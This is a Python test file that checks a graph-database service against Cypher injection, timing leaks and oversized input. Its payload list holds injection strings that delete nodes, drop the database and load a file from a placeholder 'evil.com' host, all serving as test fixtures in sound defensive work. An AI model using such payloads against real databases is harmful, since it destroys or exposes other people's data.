"""Security tests — injection, timing attacks, auth bypass, input validation."""

import hashlib
import hmac
import time

import pytest

from app.services.pre_audit import ALLOWED_PREDICATES


# ─── Cypher Injection Attempts ────────────────────────────────────────────────

class TestCypherInjection:
    """Test that malicious predicates cannot inject Cypher queries."""

    INJECTION_PAYLOADS = [
        "HACKS}]->(s) DELETE s //",
        "IS_A}]->(o) DETACH DELETE o WITH o MATCH (n) DELETE n //",
        'RELATED_TO {x: "y"}]->(o) RETURN o.name //--',
        "IS_A]->(o) CALL db.labels() YIELD label RETURN label //",
        "RELATED_TO}]->(o) LOAD CSV FROM 'http://evil.com' AS line //",
        "IS_A\n}]->(o)\nDETACH DELETE o\n//",
        "IS_A`; DROP DATABASE neo4j; --",
        "IS_A\\u007D]->(o) DELETE o //",
    ]

    def test_injection_payloads_rejected_by_whitelist(self):
        """All injection payloads must be rejected by the predicate whitelist."""
        for payload in self.INJECTION_PAYLOADS:
            assert payload.upper() not in ALLOWED_PREDICATES, \
                f"Injection payload '{payload}' is in the whitelist!"

    def test_only_known_predicates_in_whitelist(self):
        """Whitelist should only contain safe, known predicates."""
        for pred in ALLOWED_PREDICATES:
            assert pred.isalpha() or "_" in pred, \
                f"Predicate '{pred}' contains suspicious characters"
            assert len(pred) < 50, f"Predicate '{pred}' is suspiciously long"
            assert not any(c in pred for c in "{}[]()\\;\"'"), \
                f"Predicate '{pred}' contains Cypher special characters"


# ─── Timing Attack Resistance ─────────────────────────────────────────────────

class TestTimingAttacks:
    """Test that key comparison doesn't leak timing information."""

    def test_hmac_compare_digest_used(self):
        """Verify that hmac.compare_digest is constant-time."""
        secret = "lbk-admin-correct-key-12345678901234567890"

        # Measure timing for correct vs wrong keys
        correct_times = []
        wrong_times = []

        for _ in range(100):
            t0 = time.perf_counter_ns()
            hmac.compare_digest(secret, secret)
            correct_times.append(time.perf_counter_ns() - t0)

            t0 = time.perf_counter_ns()
            hmac.compare_digest(secret, "x" * len(secret))
            wrong_times.append(time.perf_counter_ns() - t0)

        avg_correct = sum(correct_times) / len(correct_times)
        avg_wrong = sum(wrong_times) / len(wrong_times)

        # Timing difference should be < 20% (constant-time)
        ratio = max(avg_correct, avg_wrong) / max(min(avg_correct, avg_wrong), 1)
        assert ratio < 2.0, \
            f"Timing ratio {ratio:.2f} suggests non-constant comparison"

    def test_standard_compare_leaks_timing(self):
        """Demonstrate that standard == comparison IS timing-vulnerable."""
        # This test documents WHY we need hmac.compare_digest
        secret = "a" * 1000
        prefix_match = "a" * 999 + "b"  # Matches 999 chars
        no_match = "b" * 1000           # Matches 0 chars

        prefix_times = []
        nomatch_times = []

        for _ in range(1000):
            t0 = time.perf_counter_ns()
            _ = secret == prefix_match
            prefix_times.append(time.perf_counter_ns() - t0)

            t0 = time.perf_counter_ns()
            _ = secret == no_match
            nomatch_times.append(time.perf_counter_ns() - t0)

        # Standard comparison MAY show timing difference (not guaranteed on all platforms)
        # This test just documents the risk, not a hard assertion


# ─── Input Validation ─────────────────────────────────────────────────────────

class TestInputValidation:
    """Test that oversized or malformed inputs are rejected."""

    def test_entity_name_max_length(self):
        """Entity names over 512 chars should be rejected."""
        from app.models.schemas import KnowledgeBundle
        bundle = KnowledgeBundle(
            origin_node_id="test",
            pushed_at="2026-01-01T00:00:00Z",
            entities=[{"name": "A" * 513}],
        )
        from app.services.pre_audit import stage_1_syntax
        ok, notes = stage_1_syntax(bundle)
        assert not ok

    def test_triple_field_max_length(self):
        """Triple fields over 512 chars should be rejected at Pydantic level."""
        import pydantic
        from app.models.schemas import Triple
        with pytest.raises(pydantic.ValidationError):
            Triple(
                subject="A" * 513, subject_type="T",
                predicate="IS_A",
                object="B", object_type="T",
                confidence=0.5, domain="general",
            )

    def test_api_key_hash_consistency(self):
        """Verify API key hashing produces consistent results."""
        from app.db.crud import _hash_key
        key = "lbk-test-key-12345678901234567890"
        h1 = _hash_key(key)
        h2 = _hash_key(key)
        assert h1 == h2
        assert h1 != _hash_key(key + "x")
        assert len(h1) == 64  # SHA-256 hex digest
